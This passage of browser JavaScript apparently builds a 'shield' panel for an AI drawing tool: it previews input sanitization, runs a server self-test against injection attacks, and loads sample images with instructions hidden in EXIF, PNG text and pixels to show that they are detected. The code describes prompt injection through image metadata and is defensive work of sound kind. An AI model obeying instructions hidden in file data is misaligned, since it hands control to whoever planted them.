      const go = () => { const r = sanitizeText(inp.value, { max: 300 }); out.textContent = `Sent to the AI as:\n${r.text || '(empty)'}\n\nFlags: ${r.flags.length ? r.flags.map((f) => FLAG_HELP[f] || f).join('; ') : 'none'}`; };
      inp.oninput = go; return h('div', {}, inp, out); })(),
    events.length ? h('div', {}, h('h3', {}, 'Recent events'), h('ul', { class: 'shield-log' }, ...events.slice(0, 8).map((e) => h('li', {}, `${new Date(e.t).toLocaleTimeString()} · ${e.route} · ${e.flags.map((f) => FLAG_HELP[f] || f).join('; ')}`)))) : null);
}
function stressPanel() {
  const out = h('div', {}), btn = h('button', { class: 'primary small' }, '▶ Run stress test');
  btn.onclick = async () => {
    btn.disabled = true; btn.textContent = 'Running…'; const r = await api('/api/selftest', null, 8000); btn.disabled = false; btn.textContent = '↻ Run again';
    if (!r || !r.ok) { out.replaceChildren(h('p', { class: 'fine' }, 'Could not reach the server.')); return; }
    out.replaceChildren(h('p', {}, h('b', {}, `${r.passed}/${r.total} checks passed`), r.allPassed ? ' — every attack stopped, no normal input blocked.' : ' — something got through; see the red rows.'),
      ...r.categories.map((c) => { const ok = c.cases.filter((x) => x.ok).length; return h('details', { class: 'card', style: 'margin:6px 0' }, h('summary', {}, `${ok === c.cases.length ? '✅' : '❌'} ${c.name} (${ok}/${c.cases.length})`), h('p', { class: 'fine' }, c.why), h('ul', { class: 'shield-log' }, ...c.cases.map((x) => h('li', {}, `${x.ok ? '✓' : '✗'} ${x.name} — ${x.detail}`)))); }),
      h('details', {}, h('summary', {}, 'What this does not cover'), h('ul', { class: 'shield-log' }, ...(r.knownGaps || []).map((g) => h('li', {}, g)))));
  };
  return h('div', {}, btn, out);
}
function poisonPanel() {
  const out = h('div', { class: 'fine', style: 'margin-top:8px' });
  const mk = (label, url, name) => h('button', { class: 'ghost', onclick: async () => {
    try {
      const blob = await (await fetch(url)).blob(), file = new File([blob], name, { type: blob.type }); await inspectUpload(file);
      const img = await loadImageFromFile(file); setRef(img, name.replace(/\.[^.]+$/, ''), 'upload');
      const hits = (S.uploadScan && S.uploadScan.hits) || [];
      out.replaceChildren(h('b', {}, hits.length ? `🛡️ ${hits.length} hidden instruction(s) found in the file data:` : 'Nothing hidden found.'), h('ul', { class: 'shield-log' }, ...hits.map((x) => h('li', {}, `“${x.snippet}…” — ${FLAG_HELP[x.kind] || x.kind}`))),
        h('p', {}, 'The picture is now loaded as your reference. Its file data is discarded when it is re-drawn in your browser and stripped again on the server; text typed into the pixels is treated as data, never as instructions, and the Audit Agent still checks every marker against the real image.'));
    } catch (e) { out.textContent = `Could not load sample (${e.message})`; }
  } }, label);
  return h('div', {}, mk('Hidden in EXIF + comment (JPEG)', 'samples/poisoned-exif.jpg', 'poisoned-exif.jpg'), ' ', mk('Hidden in PNG text + painted into the picture', 'samples/poisoned-text.png', 'poisoned-text.png'), out);
}
$('btnShield').onclick = showShield;

/* ---------- draggable step card (so it never hides the thing you are drawing) ---------- */
(() => {
  const card = $('stepCard'), grip = card.querySelector('.sc-top'), KEY = 'cb.cardPos';
  const place = (x, y) => { const c = $('center').getBoundingClientRect(); x = clamp(x, 4, Math.max(4, c.width - card.offsetWidth - 4)); y = clamp(y, 4, Math.max(4, c.height - 60)); card.style.left = `${x}px`; card.style.top = `${y}px`; return [x, y]; };
  try { const v = JSON.parse(localStorage.getItem(KEY) || 'null'); if (v) requestAnimationFrame(() => place(v[0], v[1])); } catch { /* ignore */ }
  let drag = null; grip.style.cursor = 'grab'; grip.style.touchAction = 'none';
  grip.addEventListener('pointerdown', (e) => { if (e.target.closest('button')) return; const r = card.getBoundingClientRect(), c = $('center').getBoundingClientRect(); drag = { dx: e.clientX - r.left, dy: e.clientY - r.top, cx: c.left, cy: c.top }; grip.setPointerCapture(e.pointerId); e.stopPropagation(); });
  grip.addEventListener('pointermove', (e) => { if (drag) place(e.clientX - drag.cx - drag.dx, e.clientY - drag.cy - drag.dy); });
  const end = () => { if (!drag) return; drag = null; try { localStorage.setItem(KEY, JSON.stringify([parseFloat(card.style.left), parseFloat(card.style.top)])); } catch { /* ignore */ } };
  grip.addEventListener('pointerup', end); grip.addEventListener('pointercancel', end);
})();
